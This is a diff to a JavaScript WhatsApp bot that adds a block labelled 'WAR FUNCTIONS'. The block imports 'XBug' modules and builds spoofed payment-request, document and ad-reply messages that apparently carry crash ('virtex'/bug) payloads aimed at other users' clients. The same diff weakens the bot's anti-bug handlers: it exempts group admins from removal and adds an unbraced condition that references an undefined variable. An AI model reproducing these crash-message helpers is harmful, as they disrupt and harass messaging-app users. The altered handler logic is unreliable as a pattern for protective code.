@@ -202,6 +202,11 @@ const _autostick = JSON.parse(fs.readFileSync('./database/autostickpc.json'));
 let banUser = JSON.parse(fs.readFileSync('./database/banUser.json'));
 let banchat = JSON.parse(fs.readFileSync('./database/banChat.json'));
 let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'))
+xeonbugpic = fs.readFileSync('./XBug/xpic.jpeg')
+const { xeonbut2 } = require('./XBug/xeonbut2')
+const { xeonvirtex } = require('./XBug/xeonvirtex')
+const { xeonbutton } = require('./XBug/xeonbutton')
+const { xeonbrutal } = require('./XBug/xeonbrutal')
 
 //read database\\
 let tebaklagu = db.data.game.tebaklagu = []
@@ -261,6 +266,7 @@ const antiWame = m.isGroup ? ntwame.includes(from) : false
 const antiToxic = m.isGroup ? nttoxic.includes(from) : false
 const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
 const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
+const AntiNsfw2 = m.isGroup ? ntnsfw2.includes(from) : false
 const welcm = m.isGroup ? wlcm.includes(from) : false
 const isAutoStick = _autostick.includes(from)
 const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
@@ -1096,6 +1102,57 @@ XeonBotInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${kice
 					}
 				  }
 				
+				//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
+	//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
+	//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
+	const deploy = (teks) => {
+  XeonBotInc.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
+}
+
+const doc = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
+},
+"message": {
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
+"mimetype": "application/octet-stream",
+"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
+"fileLength": "64455",
+"pageCount": 1,
+"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
+"fileName": `${ownername}â˜£ï¸${xeonbrutal(prefix)}`,
+"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
+}}
+}
+
+const xezy = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
+},
+"contextInfo": {
+"stanzaId": "3EB0382EDBB2",
+"externalAdReply": {
+"previewType": "PHOTO",
+"showAdAttribution": true,
+"sourceUrl": websitex,
+"thumbnailUrl": 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
+"thumbnail": xeonbugpic,
+}}}
+
+const bhosdike = (teks) => {
+ XeonBotInc.sendMessage(m.chat, { image: xeonbugpic, caption: wm, contextInfo:{"externalAdReply": {"title": botname,"body": ownername,
+previewType: "PHOTO",
+showAdAttribution: true,
+sourceUrl: websitex,
+thumbnailUrl: 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
+thumbnail: xeonbugpic,
+}
+}}, { quoted:xezy})
+}
+				
  
 //emoji 
 const emote = (satu, dua) => {
@@ -1511,7 +1568,6 @@ async function cerpen (category) {
 
 //Sementara
                      
- 
 switch(command) {
 		case 'allcommand': case 'semuafitur': case 'allfitur': case 'allcmd': {
    if (isBan) return reply(mess.ban)	 			
@@ -4874,8 +4930,10 @@ case 'rizbug12': case 'rizbug15': case 'rizbuglist': case 'rizbugstik': case 'ri
 case 'rizbuginvite': case 'riztagwae': case 'rizcatalog': case 'rizcatalogv2': case 'rizthelima': case 'crashcok': case 'rizbutton': case 'rizbugbutton':
 case 'rizbuttonbro': case 'rizlokas': case 'rizness': case 'riztagwae': 
 case 'foxinfinity': case 'foxdoc': case 'lokas': case 'polvot': {
+	if (!AntiNsfw2) 
 	if (!m.isGroup) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`\「 Bug Virus Detected 」\`\`\`\n\n*Lari Ada Bug* !!!🏃\nawoakwoakwok`}, {quoted: m}).then((res) => XeonBotInc.updateBlockStatus(m.sender, "block"))
 	if (!isBotAdmins) return 
+	if (isAdmins) return
 XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Bug Virus Detected 」\`\`\`\n\n *${pushname}* Mencoba Mengirim Bug !`}, {quoted: m})
 await sleep(850)
 await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
@@ -4886,8 +4944,10 @@ case 'b-cuy': case 'b-haicok': case 'b-ngntd': case 'b-anjay': case 'b-cokjancok
 case 'b-omaga': case 'b-omaga1': case 'b-omaga2': case 'b-omaga3': case 'b-omaga4': case 'b-omaga5': case 'b-omaga6': case 'b-omaga7': case 'b-omaga8': case 'b-omaga9': case 'b-omaga10': case 'b-omaga11': case 'b-omaga12': 
 case 'b-bugpc': case 'b-ngontol': case 'b-ngontolcok': case 'b-ngntolpler': case 'b-bugvn': case 'b-lokasi': case 'b-bugdoc': case 'b-bugkon': case 'b-bugkon2': case 'b-kontak': case 'b-liveloc': case 'b-livelocv2': case 'b-anjeng': case 'b-buglist': case 'b-tag': 
 case 'b-catalog': case 'b-catalogv2': case 'b-bugstik': case 'b-limo': case 'b-sendvir': case 'b-bugbutton': case 'b-bugbutton2': case 'b-bugbutton3': case 'jadibug-gambar': case 'jadibug-dokumen': {
+	if (!AntiNsfw2)
 	if (!m.isGroup) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`\「 Bug Virus Detected 」\`\`\`\n\n*Lari Ada Bug* !!!🏃\nawoakwoakwok`}, {quoted: m}).then((res) => XeonBotInc.updateBlockStatus(m.sender, "block"))
 	if (!isBotAdmins) return 
+	if (isAdmins) return
 XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Bug Virus Detected 」\`\`\`\n\nGoodBye Hambaque! *${pushname}* 👋`}, {quoted: m})
 await sleep(850)
 await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
@@ -4897,6 +4957,7 @@ break
 case 'ted': {
 	if (!m.isGroup) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`\「 Bug Virus Detected 」\`\`\`\n\n*Lari Ada Bug* !!!??\nawoakwoakwok`}, {quoted: m}).then((res) => XeonBotInc.updateBlockStatus(m.sender, "block"))
 	if (!isBotAdmins) return 
+	if (isAdmins) return
 XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Bug Virus Detected 」\`\`\`\n\nGoodBye Hambaque! *${pushname}* 👋`}, {quoted: m})
 await sleep(850)
 await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
@@ -4930,6 +4991,7 @@ case 'jadingeness': case 'jadidarkness': case 'jadikintil': case 'jadikintil': c
 case 'jadikontol': case 'jadibugloc': case 'jadiliveloc': case 'jadicatalog': case 'jadibuttonimg': {
 if (!m.isGroup) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`\「 Bug Virus Detected 」\`\`\`\n\n*Lari Ada Bug* !!!🏃\nawoakwoakwok`}, {quoted: m}).then((res) => XeonBotInc.updateBlockStatus(m.sender, "block"))
 	if (!isBotAdmins) return reply(`\`\`\`「 Bug Virus Detected 」\`\`\``)
+	if (isAdmins) return
 XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Bug Virus Detected 」\`\`\`\n\n *${pushname}* Mencoba Mengirim Bug !`}, {quoted: m})
 await sleep(850)
 await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
@@ -12544,7 +12606,7 @@ let nganu = await fetchJson(`https://apimu.my.id/downloader/youtube3?link=${text
  let kice = m.sender
  let buttons = [{buttonId: `ytvd2 ${text}`, buttonText: {displayText: '360p'}},
  {buttonId: `ytvd3 ${text}`, buttonText: {displayText: '480p'}},
- {buttonId: `ytvd4 ${text}`, buttonText: {displayText: '720'}}]
+ {buttonId: `ytvd4 ${text}`, buttonText: {displayText: '720p'}}]
                  XeonBotInc.sendButtonText(m.chat, buttons, caption, botname, m) 
  } catch {(err) => reply(`_*Server tidak merespon, coba lagi nanti*_\n\n*Alternative:* https://id.savefrom.net/210/`)}
 break
@@ -16656,6 +16718,7 @@ Kenneth (Me)
 My dog
 And all monkey who helped assemble this sexy script!`)
 }
+
 
 break
             default:
